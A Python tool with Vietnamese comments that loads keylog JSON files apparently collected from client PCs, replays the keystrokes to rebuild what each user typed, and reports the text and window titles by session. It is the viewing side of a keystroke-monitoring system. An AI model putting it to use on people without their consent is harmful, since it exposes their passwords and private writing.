#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PC Tracker Keylog Display Tool - Fixed Version
Hiển thị nội dung thực tế người dùng đã gõ từ keylogs
"""

import json
import os
import glob
from datetime import datetime
from typing import List, Dict, Any

class KeylogDisplay:
    def __init__(self, keylog_dir: str = "data/keylogs"):
        self.keylog_dir = keylog_dir
        self.all_keystrokes = []

    def load_all_keylogs(self) -> List[Dict[str, Any]]:
        """Đọc tất cả file keylog và merge thành một danh sách"""
        keylog_files = glob.glob(os.path.join(self.keylog_dir, "*.json"))
        all_keystrokes = []
        
        print(f"Tìm thấy {len(keylog_files)} file keylog...")
        
        for file_path in sorted(keylog_files):
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    
                # Thêm thông tin file vào mỗi keystroke
                for keystroke in data.get('data', []):
                    keystroke['file_source'] = os.path.basename(file_path)
                    keystroke['client_id'] = data.get('client_id', 'Unknown')
                    keystroke['received_at'] = data.get('received_at', '')
                    all_keystrokes.append(keystroke)
                    
            except Exception as e:
                print(f"Lỗi khi đọc file {file_path}: {e}")
                
        # Sắp xếp theo timestamp
        all_keystrokes.sort(key=lambda x: x.get('timestamp', ''))
        self.all_keystrokes = all_keystrokes
        
        print(f"Đã load {len(all_keystrokes)} keystrokes từ {len(keylog_files)} files")
        return all_keystrokes

    def is_printable_key(self, keystroke: str) -> bool:
        """Kiểm tra xem keystroke có tạo ra ký tự có thể in được không"""
        if not keystroke:
            return False
            
        keystroke_lower = keystroke.lower()
        
        # Các phím chức năng không tạo ra ký tự
        function_keys = {
            'backspace', 'delete', 'enter', 'return', 'tab', 'space',
            'shift', 'ctrl', 'alt', 'caps_lock', 'escape', 'home', 'end',
            'page_up', 'page_down', 'up', 'down', 'left', 'right',
            'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12',
            'win', 'cmd', 'menu', 'print_screen', 'scroll_lock', 'pause', 'insert', 'num_lock'
        }
        
        # Phím kết hợp (ctrl+c, shift+a, ctrl_l, shift_r, etc.)
        if '+' in keystroke_lower or keystroke_lower.endswith('_l') or keystroke_lower.endswith('_r'):
            return False
            
        # Phím chức năng
        if keystroke_lower in function_keys:
            return False
            
        # Ký tự đơn có thể in được (loại bỏ ký tự lạ)
        if len(keystroke) == 1:
            # Loại bỏ các ký tự đặc biệt không mong muốn
            unwanted_chars = ['·', '•', '◦', '▪', '▫', '□', '■', '‌', '‍', '‎', '‏']
            if keystroke in unwanted_chars:
                return False
            return keystroke.isprintable()
            
        return False

    def group_by_session(self, max_gap_minutes: int = 30) -> List[List[Dict[str, Any]]]:
        """Nhóm keystrokes thành các session dựa trên khoảng thời gian"""
        if not self.all_keystrokes:
            return []
            
        sessions = []
        current_session = [self.all_keystrokes[0]]
        
        for i in range(1, len(self.all_keystrokes)):
            current_time = datetime.fromisoformat(self.all_keystrokes[i]['timestamp'].replace('Z', '+00:00'))
            prev_time = datetime.fromisoformat(self.all_keystrokes[i-1]['timestamp'].replace('Z', '+00:00'))
            
            # Tính khoảng cách thời gian
            time_diff = (current_time - prev_time).total_seconds() / 60  # phút
            
            if time_diff <= max_gap_minutes:
                current_session.append(self.all_keystrokes[i])
            else:
                sessions.append(current_session)
                current_session = [self.all_keystrokes[i]]
        
        if current_session:
            sessions.append(current_session)
            
        return sessions

    def simulate_typing(self, keystrokes: List[Dict[str, Any]]) -> str:
        """Mô phỏng quá trình gõ phím để tạo ra text cuối cùng"""
        text = ""
        cursor_pos = 0
        
        for keystroke_data in keystrokes:
            keystroke = keystroke_data.get('keystroke', '')
            keystroke_lower = keystroke.lower()
            
            # Bỏ qua ký tự rỗng
            if not keystroke:
                continue
            
            # Xử lý các phím chức năng
            if keystroke_lower == 'backspace':
                if cursor_pos > 0:
                    text = text[:cursor_pos-1] + text[cursor_pos:]
                    cursor_pos -= 1
            elif keystroke_lower == 'delete':
                if cursor_pos < len(text):
                    text = text[:cursor_pos] + text[cursor_pos+1:]
            elif keystroke_lower == 'enter':
                text = text[:cursor_pos] + '\n' + text[cursor_pos:]
                cursor_pos += 1
            elif keystroke_lower == 'tab':
                text = text[:cursor_pos] + '\t' + text[cursor_pos:]
                cursor_pos += 1
            elif keystroke_lower == 'space':
                text = text[:cursor_pos] + ' ' + text[cursor_pos:]
                cursor_pos += 1
            elif keystroke_lower in ['left', 'right', 'up', 'down', 'home', 'end', 'page_up', 'page_down']:
                # Các phím di chuyển cursor (không thay đổi text)
                pass
            elif keystroke_lower in ['shift', 'ctrl', 'alt', 'caps_lock', 'escape', 'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12']:
                # Các phím chức năng không tạo ra ký tự
                pass
            elif keystroke_lower.endswith('_l') or keystroke_lower.endswith('_r'):
                # Phím modifier (ctrl_l, shift_r, etc.)
                pass
            elif '+' in keystroke_lower:
                # Phím kết hợp (ctrl+c, shift+a, etc.)
                pass
            elif self.is_printable_key(keystroke):
                # Ký tự có thể in được
                text = text[:cursor_pos] + keystroke + text[cursor_pos:]
                cursor_pos += 1
        
        return text

    def display_session(self, session: List[Dict[str, Any]], session_num: int, debug: bool = False):
        """Hiển thị một session keylog"""
        if not session:
            return
            
        start_time = datetime.fromisoformat(session[0]['timestamp'].replace('Z', '+00:00'))
        end_time = datetime.fromisoformat(session[-1]['timestamp'].replace('Z', '+00:00'))
        duration = (end_time - start_time).total_seconds() / 60  # phút
        
        print(f"\n{'='*60}")
        print(f"SESSION {session_num}")
        print(f"{'='*60}")
        print(f"Thời gian: {start_time.strftime('%Y-%m-%d %H:%M:%S')} - {end_time.strftime('%H:%M:%S')}")
        print(f"Thời lượng: {duration:.1f} phút")
        print(f"Số keystrokes: {len(session)}")
        print(f"Client ID: {session[0].get('client_id', 'Unknown')}")
        print(f"{'='*60}")
        
        # Debug: hiển thị tất cả keystrokes
        if debug:
            print(f"\nDEBUG - TẤT CẢ KEYSTROKES:")
            print(f"{'-'*40}")
            for i, keystroke_data in enumerate(session):
                keystroke = keystroke_data.get('keystroke', '')
                timestamp = datetime.fromisoformat(keystroke_data['timestamp'].replace('Z', '+00:00'))
                time_str = timestamp.strftime('%H:%M:%S.%f')[:-3]
                print(f"{i+1:2d}. [{time_str}] '{keystroke}' (len={len(keystroke)})")
            print(f"{'-'*40}")
        
        # Hiển thị text đã được mô phỏng (nội dung thực tế)
        simulated_text = self.simulate_typing(session)
        if simulated_text.strip():
            print(f"\nNỘI DUNG ĐÃ GÕ:")
            print(f"{'-'*40}")
            print(simulated_text)
            print(f"{'-'*40}")
        else:
            print(f"\n(Không có nội dung text được gõ)")
        
        # Hiển thị thông tin window
        windows = {}
        for keystroke_data in session:
            window_title = keystroke_data.get('window_title', 'Unknown')
            if window_title not in windows:
                windows[window_title] = 0
            windows[window_title] += 1
        
        print(f"\nCÁC ỨNG DỤNG ĐÃ SỬ DỤNG:")
        for window, count in windows.items():
            print(f"  • {window} ({count} keystrokes)")

    def display_all(self, debug: bool = False):
        """Hiển thị tất cả keylogs"""
        print("PC TRACKER - KEYLOG DISPLAY TOOL (FIXED)")
        print("="*60)
        
        # Load tất cả keylogs
        self.load_all_keylogs()
        
        if not self.all_keystrokes:
            print("Không tìm thấy keylog nào!")
            return
        
        # Nhóm thành sessions
        sessions = self.group_by_session()
        
        print(f"\nTỔNG QUAN:")
        print(f"  • Tổng số keystrokes: {len(self.all_keystrokes)}")
        print(f"  • Số sessions: {len(sessions)}")
        print(f"  • Thời gian bắt đầu: {datetime.fromisoformat(self.all_keystrokes[0]['timestamp'].replace('Z', '+00:00')).strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"  • Thời gian kết thúc: {datetime.fromisoformat(self.all_keystrokes[-1]['timestamp'].replace('Z', '+00:00')).strftime('%Y-%m-%d %H:%M:%S')}")
        
        # Hiển thị từng session
        for i, session in enumerate(sessions, 1):
            self.display_session(session, i, debug)
        
        print(f"\n{'='*60}")
        print("Hoàn thành hiển thị keylogs!")

    def export_to_text(self, output_file: str = "keylog_summary_fixed.txt"):
        """Xuất keylogs ra file text"""
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write("PC TRACKER - KEYLOG SUMMARY (FIXED)\n")
            f.write("="*60 + "\n\n")
            
            sessions = self.group_by_session()
            
            for i, session in enumerate(sessions, 1):
                start_time = datetime.fromisoformat(session[0]['timestamp'].replace('Z', '+00:00'))
                end_time = datetime.fromisoformat(session[-1]['timestamp'].replace('Z', '+00:00'))
                duration = (end_time - start_time).total_seconds() / 60
                
                f.write(f"SESSION {i}\n")
                f.write("="*60 + "\n")
                f.write(f"Thời gian: {start_time.strftime('%Y-%m-%d %H:%M:%S')} - {end_time.strftime('%H:%M:%S')}\n")
                f.write(f"Thời lượng: {duration:.1f} phút\n")
                f.write(f"Số keystrokes: {len(session)}\n")
                f.write(f"Client ID: {session[0].get('client_id', 'Unknown')}\n")
                f.write("="*60 + "\n\n")
                
                # Nội dung đã gõ
                simulated_text = self.simulate_typing(session)
                if simulated_text.strip():
                    f.write("NỘI DUNG ĐÃ GÕ:\n")
                    f.write("-"*40 + "\n")
                    f.write(simulated_text + "\n")
                    f.write("-"*40 + "\n\n")
                else:
                    f.write("(Không có nội dung text được gõ)\n\n")
                
                # Thông tin ứng dụng
                windows = {}
                for keystroke_data in session:
                    window_title = keystroke_data.get('window_title', 'Unknown')
                    if window_title not in windows:
                        windows[window_title] = 0
                    windows[window_title] += 1
                
                f.write("CÁC ỨNG DỤNG ĐÃ SỬ DỤNG:\n")
                for window, count in windows.items():
                    f.write(f"  • {window} ({count} keystrokes)\n")
                
                f.write("\n" + "="*60 + "\n\n")
        
        print(f"Đã xuất keylogs ra file: {output_file}")

def main():
    """Hàm main"""
    display = KeylogDisplay()
    
    print("Chọn chế độ hiển thị:")
    print("1. Hiển thị trên console")
    print("2. Xuất ra file text")
    print("3. Cả hai")
    print("4. Debug mode (hiển thị chi tiết keystrokes)")
    
    choice = input("Nhập lựa chọn (1/2/3/4): ").strip()
    
    if choice in ['1', '3']:
        display.display_all()
    elif choice == '4':
        display.display_all(debug=True)
    
    if choice in ['2', '3']:
        output_file = input("Nhập tên file output (mặc định: keylog_summary_fixed.txt): ").strip()
        if not output_file:
            output_file = "keylog_summary_fixed.txt"
        display.export_to_text(output_file)

if __name__ == "__main__":
    main()
